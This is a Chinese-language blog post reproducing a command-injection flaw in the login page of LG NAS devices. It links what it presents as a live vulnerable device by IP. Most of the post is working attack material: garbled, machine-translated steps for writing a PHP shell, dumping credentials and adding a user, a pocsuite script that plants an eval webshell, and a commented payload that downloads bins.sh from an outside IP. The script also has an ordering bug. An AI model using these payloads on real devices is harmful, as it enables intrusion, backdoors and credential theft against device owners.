---
layout:     post
title:    Unpatched Flaw Exposes LG NAS Devices to Remote Attacks
subtitle:  LG NAS
date:       2018-11-16
author:     DC
header-img: img/post-bg-universe.jpg
catalog: true
tags:

    - LG NAS
    - VUL
---


# Unpatched Flaw Exposes LG NAS Devices to Remote Attacks

跟进[LG NAS 暴露漏洞问题的文章](https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/)复现并说明相关问题

![img](https://www.vpnmentor.com/wp-content/uploads/2018/04/Vulnerability-Found-in-Majority-of-LG-NAS-Devices-1024x536.png)

该设备为小型私有云设备会提供一个web登录界面

这里提供一个[站点例子](http://221.142.116.110:8000/en/login/login.php)

原始官方披露的问题为 命令注入

可通过以下操作进行攻击

```shell
我们可以通过添加它来简单地触发此错误。要添加新用户，我们可以使用以下命令编写一个名为c.php的持久shell：; 
echo“”> / tmp / x2; sudo mv / tmp / x2 /var/www/c.php将其
输入为密码漏洞利用漏洞。

然后，通过传递以下命令，我们可以“转储”用户：
echo“.dump user”| sqlite3 /etc/nas/db/share.db
转储意味着读取所有数据库数据。我们转储数据库，以便我们可以看到用户的用户名和密码。这也让我们自己添加。

要将新用户添加到数据库中，我们需要生成有效的MD5。我们可以使用附带的MD5工具创建一个使用用户名“test”和密码“1234”的哈希.sudo 
nas-common md5 1234
一旦我们有了有效的密码和用户名，我们就可以使用以下内容将其添加到数据库中：
INSERT INTO“user”VALUES（'test'，'md5_hash'，'Vuln Test'，'test @ localhost'，''）; 
完成此操作后，我们可以使用用户名test和密码1234登录LG Network Storage。
```

测试完全可以成功

这里进行POC编写如下

```python
#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register
import re,sys


def findStr(string, subStr='/', findCnt=3):                                                  
    listStr = string.split(subStr,findCnt)                                                   
    if len(listStr) <= findCnt:    #分割完后的字符串的长度（分割段）与要求出现的次数比较     
        return -1                                                                            
    return len(string)-len(listStr[-1])-len(subStr)                                          
    #len(listStr[-1])最后的一个集合里面字符串的长度  ，len(subStr)  减去本身的长度           
    #&op_mode=login&id=admin&password=pass;echo "<?php echo \\\"<pre>\\\";\@eval(\$_POST[\\\"pass\\\"]); echo \\\"</pre>\\\";?>" >/tmp/x2;sudo mv /tmp/x2 /var/www/b.php&mobile=false

    #;echo "" > /tmp/x2;sudo mv /tmp/x2 /var/www/d.php&mobile=false
    
    #&op_mode=login&id=admin&password=pass;echo "<?php echo \"<pre>\";\@eval(\$_POST['pass']); echo \"</pre>\";?>" >/tmp/x2;sudo wget -O /tmp/bins.sh http://149.28.93.152/bins.sh &mobile=false

    #&op_mode=login&id=admin&password=pass;echo "<?php echo \"<pre>\";\@eval(\$_POST[\"pass\"]); echo \"</pre>\";?>" >/tmp/x2;sudo mv /tmp/x2 /var/www/a.php&mobile=false

def real_url(url):
    while 1:
        url = url +'/'
        res2 = req.get(url)
        content = res2.content
        pattern = re.search('URL=.*',content)
        content = content[content.rfind('=')+1:content.rfind('"')]
        if pattern:
            if content.startswith("http://"):
                url = content
            else:
                url = url+content
            match_result2 = re.search('login/login.php',url)
            if match_result2:
                url = url.replace('login/login.php','php/login_check.php')
                break
            else:
                pass
        else:
            break  
    return url
    
        
class TestPOC(POCBase):
    vulID = '0'  # vul ID
    version = '1'
    author = ['wq']
    vulDate = '2018-04-25'
    createDate = '2018-04-25'
    updateDate = '2018-04-25'
    references = ['https://paper.tuisec.win/detail/573fc6537ba9df3']
    name = 'Unpatched Flaw Exposes LG NAS Devices to Remote Attacks'
    appPowerLink = 'www.lg.com'
    appName = 'LG-NAS'
    appVersion = ''
    vulType = 'Code Execution'
    desc = '''
         According to researchers, 
         the password parameter in the login page is vulnerable to command injection. 
         An attacker can abuse this parameter to execute arbitrary commands, 
         including for adding a new user account and dumping the database containing existing usernames and passwords.
    '''

    samples = ['']
    
    def _attack(self):
        head = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0)"}
        self.url = real_url(self.url)
        response1 = req.post(self.url,data=payload_data,headers=head)
        payload_data = '&op_mode=login&id=admin&password=pass;echo "<?php echo \\\"<pre>\\\";\@eval(\$_POST[1337]); echo \\\"</pre>\\\";?>" >/tmp/x2;sudo mv /tmp/x2 /var/www/b.php&mobile=false'   #此处通过命令注入 写入一句话木马<=========
        response2 = req.post(self.url,data=payload_data,headers=head)
        res = req.get(str(self.url[0:findStr(string=self.url)])+'/b.php') #判断写入是否成功<=========
        if res.status_code == 200:
            return self.parse_attack(True)
        else:
            return self.parse_attack(False)
    def _verify(self):
        return self._attack()
        
    def parse_attack(self, response):
        output = Output(self)
        result = {}
        if response:
            result['ShellInfo'] = {}
            result['ShellInfo']['ShellURL'] = str(self.url[0:findStr(string=self.url)])+'/b.php'
            output.success(result)
        else:
            output.fail('Getshell failed')
        return output

register(TestPOC)
```

一句话木马

<?php eval($_POST[cmd]);?>

执行post 的cmd   

